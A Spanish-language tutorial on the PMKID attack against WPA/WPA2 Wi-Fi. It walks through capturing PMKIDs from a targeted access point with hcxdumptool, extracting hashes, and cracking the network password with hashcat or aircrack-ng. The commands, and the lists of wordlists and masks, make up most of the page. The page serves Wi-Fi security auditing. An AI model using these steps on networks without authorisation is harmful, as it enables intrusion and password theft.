# PMKID Attack

El PMKID (Pairwise Master Key Identifier) es un identificador de 128 bits incluido en el primer mensaje del handshake de 4 vías (EAPOL Message 1). Fue descubierto como vector de ataque en 2018 por Jens Steube (autor de hashcat).

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID_AP || MAC_Cliente)
PMK   = PBKDF2(HMAC-SHA1, Contraseña, SSID, 4096, 256)

→ El PMKID se puede calcular directamente desde la contraseña
→ No es necesario el handshake completo (mensajes 2, 3, 4)
→ No es necesario que ningún cliente esté conectado
```

### Ventajas del PMKID sobre el Handshake clásico

|                     | Handshake 4-Way          | PMKID Attack             |
| ------------------- | ------------------------ | ------------------------ |
| Clientes necesarios | SÍ (mínimo 1)            | NO                       |
| Deauth necesario    | SÍ (para acelerar)       | NO                       |
| Ruido generado      | Medio-alto               | Mínimo                   |
| Tiempo de captura   | Segundos-minutos         | Segundos                 |
| Compatibilidad      | Todos los APs            | APs con roaming (80-90%) |
| Formato de cracking | Mismo (hashcat -m 22000) | Mismo                    |

### Preparación

```bash
# Verificar que hcxtools está instalado
hcxdumptool --version
hcxpcapngtool --version

# Instalar si no están
apt install hcxtools hcxdumptool

# Activar modo monitor
airmon-ng check kill
airmon-ng start wlan0
```

### Paso 1 — Capturar el PMKID con hcxdumptool

```bash
# Captura básica — todos los APs del entorno
hcxdumptool -i wlan0mon -o captura_pmkid.pcapng --enable_status=3

# La herramienta muestra en tiempo real:
# [+] PMKID  → PMKID capturado ← esto es lo que buscamos
# [+] EAPOL  → handshake capturado (también válido)
# [+] M1M2   → mensajes 1 y 2 del handshake

# Cuando aparezca "[+] PMKID" para el AP objetivo → Ctrl+C
# (Puede tardar desde segundos hasta minutos dependiendo del AP)
```

#### Filtrar por AP específico

```bash
# Crear archivo con el BSSID objetivo (sin dos puntos, en minúsculas)
echo "aabbccddeeff" > ap_objetivo.txt

# Capturar solo el PMKID del AP específico
hcxdumptool -i wlan0mon \
    -o pmkid_objetivo.pcapng \
    --enable_status=3 \
    --filterlist_ap=ap_objetivo.txt \
    --filtermode=2

# --filtermode=2 → capturar SOLO los APs de la lista
# --filtermode=1 → capturar TODOS excepto los de la lista
```

#### Capturar PMKID y handshakes simultáneamente

```bash
# hcxdumptool captura ambos formatos en el mismo archivo
# Especialmente útil si el PMKID no está disponible en un AP
hcxdumptool -i wlan0mon \
    -o captura_completa.pcapng \
    --enable_status=3 \
    --filterlist_ap=ap_objetivo.txt \
    --filtermode=2 \
    --active_beacon          # envía beacons para provocar respuestas

# Opciones útiles adicionales:
# --rcascan      → escaneo de canales automático
# --channel=6    → fijar canal específico
# --filterlist_sta=clientes.txt → filtrar por clientes específicos
```

### Paso 2 — Extraer el hash del pcapng

```bash
# Extraer PMKID y EAPOL del archivo de captura
hcxpcapngtool -o hash.22000 captura_pmkid.pcapng

# Verificar que se generaron hashes
cat hash.22000

# Formato del hash (modo 22000):
# WPA*01*PMKID*BSSID*CLIENTMAC*ESSID_HEX*...  ← PMKID
# WPA*02*HASH*BSSID*CLIENTMAC*ESSID_HEX*...   ← EAPOL handshake

# WPA*01* → PMKID
# WPA*02* → EAPOL (handshake)

# Si quieres solo los PMKID (sin los EAPOL):
grep "WPA\*01\*" hash.22000 > solo_pmkid.22000

# Información adicional del pcapng
hcxpcapngtool captura_pmkid.pcapng
# Muestra: APs encontrados, clientes, PMKIDs, handshakes
```

#### Extraer información adicional

```bash
# Ver los ESSIDs capturados (en texto claro)
hcxpcapngtool captura_pmkid.pcapng --essid-wordlist=essids.txt
cat essids.txt

# Ver información detallada de cada AP
hcxpcapngtool captura_pmkid.pcapng -E essids_completo.txt \
    -I identidades.txt -U usuarios.txt

# Generar wordlist a partir de los ESSIDs capturados
# (Las contraseñas suelen estar relacionadas con el nombre de la red)
cat essids.txt | tr '[:upper:]' '[:lower:]' >> wordlist_custom.txt
```

### Paso 3 — Cracking con Hashcat

El formato `.22000` unifica PMKID y EAPOL en un mismo modo de hashcat.

```bash
# Ataque por diccionario
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt

# Con reglas (más efectivo)
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Ataque por máscara — 8 dígitos (routers con PIN como contraseña)
hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d

# Fuerza bruta de 8 caracteres alfanuméricos
hashcat -m 22000 hash.22000 -a 3 ?a?a?a?a?a?a?a?a

# Wordlist específica para Wi-Fi
hashcat -m 22000 hash.22000 \
    /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt

# Múltiples wordlists a la vez
hashcat -m 22000 hash.22000 \
    /usr/share/wordlists/rockyou.txt \
    /usr/share/wordlists/fasttrack.txt \
    wordlist_custom.txt

# Ver contraseña si ya fue crackeada antes
hashcat -m 22000 hash.22000 --show
```

### Paso 4 — Cracking con aircrack-ng&#x20;

```bash
# Convertir .22000 a .hccapx para aircrack (si se prefiere)
# O usar directamente el .cap capturado (si también capturó handshake)

aircrack-ng captura_pmkid.pcapng -w /usr/share/wordlists/rockyou.txt
```

### Por qué algunos APs no son vulnerables al PMKID

```
APs que NO incluyen PMKID en EAPOL Message 1:
→ Routers con firmware muy antiguo (anterior a 802.11r)
→ Algunos modelos Mikrotik
→ Algunos APs enterprise con configuración estricta
→ APs con WPA3 (SAE en lugar de PSK)

En ese caso:
→ Usar el handshake clásico (Página anterior)
→ Usar hcxdumptool igualmente: capturará el EAPOL handshake
   aunque no haya PMKID disponible
```

### Flujo completo resumido

```bash
# 1. Preparar entorno
airmon-ng check kill
airmon-ng start wlan0

# 2. Identificar el objetivo
airodump-ng wlan0mon   # anotar BSSID

# 3. Preparar filtro
echo "BSSIDSINPUNTOS" > target.txt  # ej: aabbccddeeff

# 4. Capturar PMKID
hcxdumptool -i wlan0mon -o pmkid.pcapng \
    --enable_status=3 \
    --filterlist_ap=target.txt \
    --filtermode=2
# Ctrl+C cuando veas [+] PMKID

# 5. Extraer hash
hcxpcapngtool -o hash.22000 pmkid.pcapng

# 6. Crackear
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# 7. Ver resultado
hashcat -m 22000 hash.22000 --show
```

### Combinar PMKID + Handshake en una sola captura

```bash
# hcxdumptool captura ambos automáticamente
# Si un AP no tiene PMKID → igualmente capturará el handshake
# (si hay clientes o si se genera tráfico)

hcxdumptool -i wlan0mon \
    -o captura_total.pcapng \
    --enable_status=3 \
    --filterlist_ap=target.txt \
    --filtermode=2

# hcxpcapngtool extrae ambos al mismo archivo .22000
hcxpcapngtool -o hash_total.22000 captura_total.pcapng

# hashcat -m 22000 trabaja con ambos formatos (PMKID y EAPOL) a la vez
hashcat -m 22000 hash_total.22000 /usr/share/wordlists/rockyou.txt
```

> El PMKID attack es **más silencioso que el handshake clásico** porque no requiere enviar paquetes de deauth. Es la técnica recomendada como primer intento en cualquier auditoría Wi-Fi.

> Si `hcxdumptool` lleva varios minutos sin capturar un PMKID, el AP probablemente no lo incluye. Cambiar a la técnica de handshake con deauth o intentar PMKID en otro canal si el AP tiene múltiples radios.

> El archivo `.22000` puede contener múltiples hashes de distintos APs si no se filtra. Usar `--show` con cuidado para no confundir los resultados de distintas redes.
